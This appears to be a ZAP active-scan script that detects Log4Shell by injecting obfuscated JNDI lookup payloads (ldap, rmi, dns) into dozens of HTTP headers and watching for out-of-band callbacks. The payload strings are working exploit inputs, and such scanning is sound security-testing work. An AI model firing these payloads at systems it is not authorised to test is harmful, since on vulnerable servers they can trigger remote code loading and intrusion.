// Note that new active scripts will initially be disabled
// Right click the script in the Scripts tree and select "enable"  
var Control = Java.type("org.parosproxy.paros.control.Control")
var extOast = Control.getSingleton().getExtensionLoader().getExtension("ExtensionOast")
var boast = extOast.getActiveScanOastService()

var payload_templates = [
    '${jndi:ldap://DOMAIN/abc}',
    '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://DOMAIN}/abc}',
    '${${::-j}ndi:rmi://DOMAIN}/abc}',
    '${jndi:rmi://DOMAIN}}',
    '${jndi:dns://DOMAIN/abc}',
    '${jndi:${lower:l}${lower:d}a${lower:p}://DOMAIN/abc}'
]

var header_list = ['Referer','X-Api-Version','Accept-Charset','Accept-Datetime','Accept-Encoding','Accept-Language','Cookie','Forwarded','Forwarded-For','Forwarded-For-Ip','Forwarded-Proto','From','TE','True-Client-IP','Upgrade','User-Agent','Via','Warning','X-Api-Version','Max-Forwards','Origin','Pragma','DNT','Cache-Control','X-Att-Deviceid','X-ATT-DeviceId','X-Correlation-ID','X-Csrf-Token','X-CSRFToken','X-Do-Not-Track','X-Foo','X-Foo-Bar','X-Forwarded','X-Forwarded-By','X-Forwarded-For','X-Forwarded-For-Original','X-Forwarded-Host','X-Forwarded-Port','X-Forwarded-Proto','X-Forwarded-Protocol','X-Forwarded-Scheme','X-Forwarded-Server','X-Forwarded-Ssl','X-Forwarder-For','X-Forward-For','X-Forward-Proto','X-Frame-Options','X-From','X-Geoip-Country','X-Http-Destinationurl','X-Http-Host-Override','X-Http-Method','X-Http-Method-Override','X-HTTP-Method-Override','X-Http-Path-Override','X-Https','X-Htx-Agent','X-Hub-Signature','X-If-Unmodified-Since','X-Imbo-Test-Config','X-Insight','X-Ip','X-Ip-Trail','X-ProxyUser-Ip','X-Requested-With','X-Request-ID','X-UIDH','X-Wap-Profile','X-XSRF-TOKEN']
/**
 * Scans a "node", i.e. an individual entry in the Sites Tree.
 * The scanNode function will typically be called once for every page. 
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 */
function scanNode(as, msg) {

	// Debugging can be done using println like this
	print('scan called for url=' + msg.getRequestHeader().getURI().toString());
	
	for (var h in header_list){
		var header_name = header_list[h]
		for (var v in payload_templates){
		
		// Copy requests before reusing them
		var newmsg = msg.cloneRequest();
		var alert= as.newAlert().setRisk(3)
			.setConfidence(3)
			.setName('Log4JshellHeader')
			.setDescription('Detect Log4Jshell Header Inject')
			.setAttack('Your attack')
			.setEvidence('OOB Lookup occur')
			.setOtherInfo('Any other info')
			.setSolution('The solution')
			.setReference('References')
			.setCweId(0)
			.setWascId(0)
			.setMessage(newmsg)
			.build()
		
		var domain_payload = extOast.registerAlertAndGetPayload(alert)
		var payload = payload_templates[v].replace('DOMAIN', domain_payload)
		alert.setAttack(payload);
		newmsg.getRequestHeader().setHeader(header_name, payload)
		// sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
		as.sendAndReceive(newmsg, false, false);
		}	

	}
	boast.poll()
}

/**
 * Scans a specific parameter in an HTTP message.
 * The scan function will typically be called for every parameter in every URL and Form for every page.
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 * @param {string} param - the name of the parameter being manipulated for this test/scan.
 * @param {string} value - the original parameter value.
 */
function scan(as, msg, param, value) {

}

